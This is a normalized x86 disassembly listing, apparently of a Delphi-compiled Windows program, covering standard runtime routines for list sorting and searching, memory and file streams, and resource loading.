test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404184
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_415938
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4159ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_419a8c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_419a94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4159b5
lea eax [ ebp - 0xc ]
call sub_404094
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_419b34
inc esi
dec ebx
jne r-xdata
sub_4159e0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_4159fc
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414c98
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404b1c
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_415a64
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_415014
jmp r-xdata
sub_415b00
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404b1c
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_415b40
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_415014
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028f0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404c08
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_415bac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_415014
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_415014
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_415c08
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415c08
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_415c2c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_415ca4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_415014
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_4040e8
pop edi
pop esi
pop ebx
retn
sub_415ce0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_415014
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_415d08
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_415d3c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_4152dc
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_415d88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_415014
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_415014
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_415ddc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_415d08
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_4040e8
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028f0
sub_415e54
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_415014
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_415014
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_4040e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415eb0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_415014
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415ef0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_415c08
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_415ef0
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_415fa0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_415ffc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_415ef0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_416050
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_416084
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_4160e8
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41613c
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403294
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
call sub_403ad0
mov esp ebp
pop ebp
retn
sub_416188
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_40328c
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41613c
pop ecx
mov eax [ ebx ]
call sub_4032d0
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41613c
pop ecx
sub_41620c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41627c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
sub_4162b4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
sub_4162ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_416070
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026f4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4163c8
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4163cf
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_402714
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41627c
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_4162b4
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_4163e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416a64
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_416430
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_418a98
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416437
mov eax [ ebp - 0x8 ]
call sub_403344
retn
sub_416440
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41649c
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_408724
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4164dc
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40d1e0
pop ebx
pop ebp
retn 0x8
sub_416504
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_416548
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_416548
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_416671
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403668
movzx edx di
mov eax esi
call sub_408648
mov ecx eax
xor edx edx
mov eax ebx
call sub_416440
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_4086c4
mov ecx eax
xor edx edx
mov eax ebx
call sub_416440
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416678
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_4040b8
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4088dc
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40b4b4
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
call sub_403ad0
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4088dc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40b4b4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
call sub_403ad0
jmp r-xdata
sub_416678
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41669c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
call sub_40875c
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4166d8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028f0
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_416710
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_416734
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_416760
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_416778
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_416070
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41627c
sub_4167b0
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_4166d0
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_4167d8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_4167b0
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_416804
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406c48
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406c2c
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406c1c
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
test ecx ecx
jne r-xdata
sub_416890
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028f0
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_4167b0
sub_4168e0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_404554
mov ecx eax
mov edx esi
mov eax edi
call sub_4169a8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_416938
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41699b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4169a2
lea eax [ ebp - 0xc ]
call sub_404094
retn
sub_4169a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
